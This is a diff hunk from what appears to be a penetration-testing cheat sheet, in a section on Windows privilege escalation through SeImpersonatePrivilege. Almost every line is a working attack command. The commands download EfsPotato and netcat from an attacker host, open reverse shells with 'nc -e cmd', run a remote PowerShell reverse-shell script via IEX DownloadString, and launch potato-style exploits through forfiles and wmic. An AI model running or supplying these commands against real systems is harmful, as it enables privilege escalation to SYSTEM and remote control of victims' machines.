@@ -1754,6 +1754,9 @@ $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
 +---------- SeImpersonatePrivilege ----------+
+curl $MYIP:53/windows/EfsPotato.exe -o EfsPotato.exe
+curl $MYIP:53/windows/nc.exe -o nc.exe
+./EfsPotato.exe "nc.exe $MYIP 80 -e cmd"
 forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5566"""
 wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 80 -e cmd\""
 wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 80 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
